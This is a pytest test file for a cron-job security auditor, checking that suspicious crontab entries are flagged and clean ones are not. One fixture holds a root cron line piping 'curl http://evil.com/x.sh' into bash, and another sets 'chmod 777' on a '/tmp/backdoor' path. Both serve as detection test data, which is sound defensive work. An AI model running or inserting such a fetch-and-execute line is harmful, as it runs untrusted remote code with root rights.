"""Tests for cron audit module."""

from __future__ import annotations

from tests.conftest import FakeExecutor, cmd, make_result

from sentinel_audit.audit.cron_audit import CronAuditor
from sentinel_audit.core.constants import Severity


def test_suspicious_curl_pipe_bash() -> None:
    executor = FakeExecutor(
        command_map={
            "cat /etc/cron.d/* 2>/dev/null || true": cmd(""),
            "for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u \"$u\" 2>/dev/null; done": cmd(""),
        },
        file_map={
            "/etc/crontab": cmd("* * * * * root curl http://evil.com/x.sh | bash"),
        },
    )
    result = make_result()
    CronAuditor(executor, result).run()

    assert any(f.id == "CRON-001" for f in result.findings)
    assert result.findings[0].severity == Severity.MEDIUM


def test_clean_cron_no_findings() -> None:
    executor = FakeExecutor(
        command_map={
            "cat /etc/cron.d/* 2>/dev/null || true": cmd(""),
            "for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u \"$u\" 2>/dev/null; done": cmd(""),
        },
        file_map={
            "/etc/crontab": cmd("0 3 * * * root /usr/bin/apt update"),
        },
    )
    result = make_result()
    CronAuditor(executor, result).run()

    assert len(result.findings) == 0


def test_chmod_777_flagged() -> None:
    executor = FakeExecutor(
        command_map={
            "cat /etc/cron.d/* 2>/dev/null || true": cmd("* * * * * root chmod 777 /tmp/backdoor"),
            "for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u \"$u\" 2>/dev/null; done": cmd(""),
        },
        file_map={
            "/etc/crontab": cmd(""),
        },
    )
    result = make_result()
    CronAuditor(executor, result).run()

    assert any(f.id == "CRON-001" for f in result.findings)


def test_cron_inventory_collected() -> None:
    executor = FakeExecutor(
        command_map={
            "cat /etc/cron.d/* 2>/dev/null || true": cmd(""),
            "for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u \"$u\" 2>/dev/null; done": cmd(""),
        },
        file_map={
            "/etc/crontab": cmd("0 3 * * * root /usr/bin/apt update\n0 4 * * * root /usr/bin/logrotate"),
        },
    )
    result = make_result()
    CronAuditor(executor, result).run()

    assert len(result.system_info.cron_jobs) >= 2
